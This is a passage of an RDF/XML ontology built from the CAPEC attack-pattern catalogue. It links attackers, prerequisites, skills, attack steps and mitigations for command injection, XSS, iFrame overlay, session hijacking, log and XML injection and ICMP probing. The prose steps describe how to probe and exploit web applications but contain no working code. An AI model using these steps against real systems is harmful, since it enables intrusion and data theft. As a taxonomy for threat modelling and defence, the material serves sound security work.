      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To load malicious script into open  e.g. world writable directory:LEVEL:Low::SKILL:Executing remote scripts on host and collecting output:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Enforce principle of least privilege::Implementation: Ensure that HTTP Get methods only retrieve state and do not alter state on the server side::Implementation: Ensure that HTTP methods have proper ACLs based on what the functionality they expose::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack412"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker477">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#57"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack477"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::300::287::724::693::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Opportunity to intercept must exist beyond the point where SSL is terminated.::The attacker must be able to insert a listener actively (proxying the communication) or passively (sniffing the communication) in the client-server communication path.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To insert a network sniffer or other listener into the communication stream:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker344">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#393"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack344"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker211">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#15">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:137::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Command Delimiters"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack211">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#15"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::146::77::184::78::185::93::140::157::138::154::697::713::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Assess Target Runtime Environment) In situations where the runtime environment is not implicitly known  the attacker makes connections to the target system and tries to determine the system&apos;s runtime environment. Knowing the environment is vital to choosing the correct delimiters.TECHNIQUE:Port mapping using network connection-based software (e.g.  nmap  nessus  etc.):TECHNIQUE:Port mapping by exploring the operating system (netstat  sockstat  etc.):TECHNIQUE:TCP/IP Fingerprinting:TECHNIQUE:Induce errors to find informative error messages::STEP:2:PHASE:Explore:DESCRIPTION:(Survey the Application) The attacker surveys the target application  possibly as a valid and authenticated userTECHNIQUE:Spidering web sites for all available links:TECHNIQUE:Inventory all application inputs::STEP:3:PHASE:Experiment:DESCRIPTION:(Attempt delimiters in inputs) The attacker systematically attempts variations of delimiters on known inputs  observing the application&apos;s response each time.TECHNIQUE:Inject command delimiters using network packet injection tools (netcat  nemesis  etc.):TECHNIQUE:Inject command delimiters using web test frameworks (proxies  TamperData  custom programs  etc.):TECHNIQUE:Enter command delimiters directly in input fields.::STEP:4:PHASE:Exploit:DESCRIPTION:(Use malicious command delimiters) The attacker uses combinations of payload and carefully placed command delimiters to attack the software.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::146::77::184::78::185::93::140::157::138::154::697::713::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Software&apos;s input validation or filtering must not detect and block presence of additional malicious command.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker has to identify injection vector  identify the specific commands  and optionally collect the output  i.e. from an interactive session.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::Ability to communicate synchronously or asynchronously with server. Optionally  ability to capture output directly through synchronous communication or other method such as FTP.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker218">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#22"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack218"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::290::287::20::200::693::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Server software must rely on client side formatted and validated values  and not reinforce these checks on the server side.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker must have fairly detailed knowledge of the syntax and semantics of client/server communications protocols and grammars:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Ability to communicate synchronously or asynchronously with server::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Implement robust physical security countermeasures and monitoring.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack434">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#624">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Fault Injection"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities:NOTE:Confidentiality Read Data Bypass Protection Mechanism Hide Activities An adversary capable of successfully collecting and analyzing sensitive  fault/side-channel information  he or she has compromised the confidentiality of that application or information system data.::SCOPE:IntegrityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Integrity Execute Unauthorized Commands If an adversary is able to inject data via a fault or side channel vulnerability towards malicious ends  the integrity of the application or information system will be compromised.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker217">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#23"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack217"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::20::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target software must consume files.::The adversary must have access to modify files that the target software will consume.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:How to poison a file with malicious payload that will exploit a vulnerability when the file is opened. The adversary must also know how to place the file onto a system where it will be opened by an unsuspecting party  or force the file to be opened.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Identify potentially malicious software that may have functionality to acquire screen captures  and audit and/or block it by using whitelisting tools.::While screen capture is a legitimate and practical function  certain situations and context may require the disabling of this feature.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack107"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Configuration: Disable Java Script in the browser::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack231"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Prevent unknown DLLs from loading through whitelisting policy.::Patch installed applications as soon as new updates become available.::Properly restrict the location of the software being used.::Use of sxstrace.exe on Windows as well as manual inspection of the manifests.::Require code signing and avoid using relative paths for resources.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack154"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker349">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#250"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack349"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::91::74::20::713::707::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::XML queries used to process user input and retrieve information stored in XML documents::User-controllable input not properly sanitized::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:An attacker must have knowledge of XML syntax and constructs in order to successfully leverage XML Injection:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker216">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#244">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#XSS Targeting URI Placeholders"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack216">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#244"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::83::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey the application) Using a browser or an automated tool  an attacker follows all public links on a web site. He records all the links he finds.TECHNIQUE:Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browser&apos;s plugins are available to facilitate the analysis or automate the URL discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:(Attempt injection payload variations on input parameters) Possibly using an automated tool  an attacker requests variations on the inputs he surveyed before. He sends parameters that include variations of payloads. He records all the responses from the server that include unmodified versions of his script.TECHNIQUE:Use a list of XSS probe strings using different URI schemes to inject in parameters of known URLs. If possible  the probe strings contain a unique identifier to trace the injected string back to the entry point.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.::STEP:3:PHASE:Exploit:DESCRIPTION:(Steal session IDs  credentials  page content  etc.) As the attacker succeeds in exploiting the vulnerability  he can choose to steal user&apos;s credentials in order to reuse or to analyze them later on.TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and sends document information to the attacker.:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker&apos;s server and then causes the browser to execute appropriately.::STEP:4:PHASE:Exploit:DESCRIPTION:(Forceful browsing) When the attacker targets the current application or another one (through CSRF vulnerabilities)  the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws  but it can also be used to create a widespread attack against a particular website on the user&apos;s current network (Internet or not).TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and performs actions on the same web site:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker&apos;s server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).::STEP:5:PHASE:Exploit:DESCRIPTION:(Content spoofing) By manipulating the content  the attacker targets the information that the user would like to get from the websiteTECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and exposes attacker-modified invalid information to the user on the current web page.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::83::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Target client software must allow scripting such as JavaScript and allows executable content delivered using a data URI scheme.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To inject the malicious payload in a web page:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Ability to send HTTP request to a web application::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.::In theory a brute force attack performing an exhaustive key space search will always succeed  so the goal is to have computational security. Moore&apos;s law needs to be taken into account that suggests that computing resources double every eighteen months.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack220"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.::Employ robust identification and audit/blocking via whitelisting of applications on your system. Unnecessary applications  utilities  and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack87">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#647">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:150::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Collect Data from Registries"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::285::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data The adversary is able to read sensitive information about the system in the registry.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker215">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#11">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:635::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Cause Web Server Misclassification"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack215">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#11"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::430::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Footprint file input vectors) Manually or using an automated tool  an attacker searches for all input locations where a user has control over the filenames or MIME types of files submitted to the web server.TECHNIQUE:Attacker manually crawls application to identify file inputs:TECHNIQUE:Attacker uses an automated tool to crawl application identify file inputs:TECHNIQUE:Attacker manually assesses strength of access control protecting native application files from user control:TECHNIQUE:Attacker explores potential for submitting files directly to the web server via independently constructed HTTP Requests::STEP:2:PHASE:Experiment:DESCRIPTION:(File misclassification shotgunning) An attacker makes changes to file extensions and MIME types typically processed by web servers and looks for abnormal behavior.TECHNIQUE:Attacker submits files with switched extensions (e.g. .php on a .jsp file) to web server.:TECHNIQUE:Attacker adds extra characters (e.g. adding an extra . after the file extension) to filenames of files submitted to web server.::STEP:3:PHASE:Experiment:DESCRIPTION:(File misclassification sniping) Understanding how certain file types are processed by web servers  an attacker crafts varying file payloads and modifies their file extension or MIME type to be that of the targeted type to see if the web server is vulnerable to misclassification of that type.TECHNIQUE:Craft a malicious file payload  modify file extension to the targeted file type and submit it to the web server.:TECHNIQUE:Craft a malicious file payload  modify its associated MIME type to the targeted file type and submit it to the web server.::STEP:4:PHASE:Exploit:DESCRIPTION:(Disclose information) The attacker  by manipulating a file extension or MIME type is able to make the web server return raw information (not executed).TECHNIQUE:Manipulate the file names that are explicitly sent to the server.:TECHNIQUE:Manipulate the MIME sent in order to confuse the web server.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::430::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Web server software must rely on file name or file extension for processing.::The attacker must be able to make HTTP requests to the web server.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To modify file name or file extension:LEVEL:Low::SKILL:To use misclassification to force the Web server to disclose configuration information  source  or binary data:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker348">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#433"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack348"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker472">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#60"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack472"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::294::290::346::384::488::539::200::285::664::732::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target host uses session IDs to keep track of the users.::Session IDs are used to control access to resources.::The session IDs used by the target host are not well protected from session theft.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:If an attacker can steal a valid session ID  he can then try to be authenticated with that stolen session ID.:LEVEL:Low::SKILL:More sophisticated attack can be used to hijack a valid session from a user and spoof a legitimate user by reusing his valid session ID.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker169">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#294"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack169"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The ability to send an ICMP type 17 query (Address Mask Request) to a remote target and receive an ICMP type 18 message (ICMP Address Mask Reply) in response. Generally  modern operating systems will ignore ICMP type 17 messages  however  routers will commonly respond to this request.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The ability to send custom ICMP queries. This can be accomplished via the use of various scanners or utilities.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker470">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#67"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack470"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::120::134::74::20::680::697::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The format string argument of the Syslog function can be tainted with user supplied data.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Leverage encryption techniques during information transactions so as to protect them from attack patterns of this kind.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack108"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Configuration: Disable iFrames in the Web browser.::Operation: When maintaining an authenticated session with a privileged target system  do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.::Operation: If using the Firefox browser  use the NoScript plug-in that will help forbid iFrames.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack383">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#222">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:103::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#iFrame Overlay"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::1021::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Craft an iFrame Overlay page) The attacker crafts a malicious iFrame overlay page.TECHNIQUE:The attacker leverages iFrame overlay capabilities to craft a malicious iFrame overlay page.::STEP:2:PHASE:Exploit:DESCRIPTION:(Attacker tricks victim to load the iFrame overlay page) Attacker utilizes some form of temptation  misdirection or coercion to trick the victim to loading and interacting with the iFrame overlay page in a way that increases the chances that the victim will visit the malicious page.TECHNIQUE:Trick the victim to the malicious site by sending the victim an e-mail with a URL to the site.:TECHNIQUE:Trick the victim to the malicious site by manipulating URLs on a site trusted by the victim.:TECHNIQUE:Trick the victim to the malicious site through a cross-site scripting attack.::STEP:3:PHASE:Exploit:DESCRIPTION:(Trick victim into interacting with the iFrame overlay page in the desired manner) The attacker tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim&apos;s level of privilege.TECHNIQUE:Hide action controls over very commonly used functionality.:TECHNIQUE:Hide action controls over very psychologically tempting content.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker471">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#93"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack471"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::117::75::150::713::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target host is logging the action and data of the user.::The target host insufficiently protects access to the logs or logging mechanisms.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:This attack can be as simple as adding extra characters to the logged data (e.g. username). Adding entries is typically easier than removing entries.:LEVEL:Low::SKILL:A more sophisticated attack can try to defeat the input validation mechanism.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker168">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#296"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack168"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The ability to send an ICMP Type 15 Information Request and receive an ICMP Type 16 Information Reply in response.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:The adversary needs to know certain linux commands for this type of attack.:LEVEL:Low::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::Scanners or utilities that provide the ability to send custom ICMP queries.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Disable RDP  telnet  SSH and enable firewall rules to block such traffic. Limit users and accounts that have remote interactive login access. Remove the Local Administrators group from the list of groups allowed to login through RDP. Limit remote user permissions. Use remote desktop gateways and multifactor authentication for remote logins.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack492"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker167">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#331"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack167"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The ability to monitor and interact with network communications.Access to at least one host  and the privileges to interface with the network interface card.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3  Port Unreachable..::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Implementation: Obfuscate server fields of HTTP response.::Implementation: Hide inner ordering of HTTP response header.::Implementation: Customizing HTTP error codes such as 404 or 500.::Implementation: Hide URL file extension.::Implementation: Hide HTTP response header software information filed.::Implementation: Hide cookie&apos;s software information filed.::Implementation: Appropriately deal with error messages.::Implementation: Obfuscate database type in Database API&apos;s error message.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack324">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#170">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:541::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
